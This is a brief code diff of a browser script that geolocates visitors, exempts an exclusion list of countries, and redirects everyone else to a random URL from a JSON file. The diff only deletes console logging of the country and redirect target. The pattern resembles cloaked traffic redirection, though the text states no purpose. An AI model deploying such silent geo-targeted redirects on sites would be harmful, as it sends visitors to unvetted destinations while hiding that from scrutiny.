@@ -56,11 +56,8 @@ const excludedCountries = ['MA', 'FR', 'ES', 'DZ', 'CN', 'EG', 'TR', 'IN', 'IR',
                 return;
             }
 
-            console.log('Detected country code:', countryCode);
-
             // Check exclusion list
             if (excludedCountries.includes(countryCode)) {
-                console.log(`Country ${countryCode} is excluded from redirection.`);
                 return;
             }
 
@@ -88,7 +85,6 @@ function redirectToUrls(jsonFile, delay = 300) {
             const randomIndex = Math.floor(Math.random() * urls.length);
             const randomUrl = urls[randomIndex];
 
-            console.log(`Redirecting to: ${randomUrl}`);
             setTimeout(() => {
                 window.location.href = randomUrl;
             }, delay);
